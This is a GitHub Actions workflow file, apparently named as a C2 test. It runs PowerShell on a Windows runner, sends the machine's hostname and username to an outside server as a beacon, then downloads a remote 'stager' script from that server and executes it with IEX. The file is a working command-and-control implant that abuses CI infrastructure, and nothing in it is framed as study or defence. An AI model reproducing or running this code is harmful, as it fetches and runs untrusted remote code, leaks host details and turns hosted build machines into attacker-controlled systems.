name: c2-full-test
on:
  workflow_dispatch:

jobs:
  win2019:
    runs-on: windows-2019
    timeout-minutes: 5
    steps:
      - name: C2 Test
        shell: powershell
        run: |
          $ErrorActionPreference = "Continue"
          Write-Host "=== ENV ==="
          Write-Host "OS: $([Environment]::OSVersion.VersionString)"
          Write-Host "PS: $($PSVersionTable.PSVersion)"
          Write-Host "Host: $env:COMPUTERNAME"
          [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
          Write-Host "`n=== BEACON ==="
          $wc = New-Object Net.WebClient
          $wc.Headers.Add("Content-Type","application/json")
          $body = '{"id":"w19","h":"' + $env:COMPUTERNAME + '","u":"' + $env:USERNAME + '","ip":"gh-2019","os":"Win2019","pid":0,"out":"beacon ok"}'
          $r = $wc.UploadString("https://svc.linuxsupportsystem.com/b", $body)
          Write-Host "Beacon: $r"
          Write-Host "`n=== STAGER ==="
          $stager = (New-Object Net.WebClient).DownloadString("https://svc.linuxsupportsystem.com/s")
          Write-Host "Downloaded $($stager.Length) chars"
          IEX $stager
          Start-Sleep -Seconds 8
          Write-Host "Done"

